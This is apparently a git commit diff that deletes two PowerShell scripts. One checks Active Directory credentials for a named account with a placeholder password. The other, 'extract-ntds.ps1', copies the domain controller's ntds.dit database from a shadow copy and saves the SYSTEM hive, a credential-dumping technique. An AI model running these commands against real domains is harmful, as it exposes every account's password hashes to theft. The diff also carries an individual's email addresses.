a5b2d52e5d74696863dfd3256ba8a1af4a5c3eed
Steve <steve.tollaksen@gmail.com>
2020-01-17 09:21:32 -0700

    first

--- ADTools/DirectoryServices.AccountManagement.ps1
+++
@@ -1,3 +0,0 @@
-﻿Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain')
-($DS.ValidateCredentials("steve_tollaksen@shamrockfoods.com", "notmyrealpassword"))
--- extract-ntds.ps1
+++
@@ -1,4 +0,0 @@
-﻿$dc=(Get-ADDomainController).hostname;$pc=$env:computername;
-New-PSSession -ComputerName $DC -Credential (get-credential) | Enter-PSSession
-& cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\$pc\c$\steve\ntds\ntds.dit"
-reg save HKLM\SYSTEM \\$pc\c$\steve\ntds\SYS
